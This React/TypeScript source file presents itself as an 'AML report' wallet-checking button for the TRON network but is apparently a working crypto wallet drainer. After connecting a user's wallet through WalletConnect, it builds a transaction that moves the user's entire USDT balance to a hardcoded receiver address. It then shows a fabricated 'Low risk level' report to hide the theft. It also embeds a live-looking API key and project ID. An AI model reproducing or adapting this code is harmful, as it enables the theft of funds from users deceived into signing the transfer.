// src/components/tronAuthButton/TronAuthButton.tsx

import React, { useState, useEffect } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';
import { Buffer } from 'buffer';

window.Buffer = Buffer; // полифилл для Buffer

// Константы контракта и получателя
const USDT_CONTRACT  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

// Инициализация TronWeb
const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: {
    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
  },
});

// Инициализация WalletConnectAdapter
const adapter = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
    metadata: {
      name: 'AML',
      description: 'TRON + WalletConnect Integration',
      url: 'https://amlreports.pro',
      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
    },
  },
  web3ModalConfig: {
    themeMode: 'dark',
  },
});

export const TronAuthButton: React.FC = () => {
  const [status,  setStatus]  = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  // Прединициализация adapter для ускорения открытия модалки
  useEffect(() => {
    // если есть метод init — вызовем его
    ;(adapter as any).init?.().catch(() => {});
  }, []);

  const connectWallet = async () => {
    if (loading) return;
    setLoading(true);
    setStatus(null);

    try {
      // Сбрасываем старую сессию, если осталась
      if (adapter.connected) {
        await adapter.disconnect();
      }
      // Подключаемся
      await adapter.connect();

      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) {
        throw new Error('Invalid wallet address');
      }
      tronWeb.setAddress(userAddress);

      // Проверяем TRX (минимум 2 TRX)
      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      const trx    = trxRaw / 1e6;
      if (trx < 2) {
        setStatus('❌ Insufficient TRX. At least 2 TRX is required.');
        return;
      }

      // Проверяем USDT
      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw      = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt         = Number(usdtRaw) / 1e6;
      if (usdt < 1) {
        setStatus('succes');
        return;
      }

      // Формируем TX
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        userAddress
      );

      // Подписываем и отправляем
      const signedTx = await adapter.signTransaction(transaction);
      const raw      = (signedTx as any).rawTransaction ?? signedTx;
      const result   = await tronWeb.trx.sendRawTransaction(raw);

      setStatus(result?.result ? 'succes' : '⚠️ Connection or transaction error');

    } catch (err: any) {
      console.error('Error:', err);
      const msg = err.message || String(err);
      if (!/User rejected|Modal is closed|Timeout/.test(msg)) {
        setStatus('⚠️ Connection or transaction error');
      }
    } finally {
      setLoading(false);
      await adapter.disconnect();
    }
  };

  return (
    <>
      <div
        className={`AuthButton${loading ? ' disabled' : ''}`}
        onClick={connectWallet}
      >
        {loading ? '🔄 Connecting...' : 'Check Wallet'}
      </div>

      {status && (
        <div className="modal__overflow">
          <div className="modal">
            {status !== 'succes' ? (
              <p>{status}</p>
            ) : (
              <>
                <div className="content greenBorder">
                  <div>0.6%</div>
                  <div>
                    <h3>Low risk level</h3>
                    <div className="nums">
                      <div><span className="circ green" /> 0–30</div>
                      <div><span className="circ orange" /> 31–69</div>
                      <div><span className="circ red" /> 70–100</div>
                    </div>
                  </div>
                </div>
                <div className="content report">
                  <p>AML report for a wallet:</p>
                  <h5>{USDT_CONTRACT}</h5>
                </div>
              </>
            )}
            <button onClick={() => setStatus(null)}>Close</button>
          </div>
        </div>
      )}
    </>
  );
};
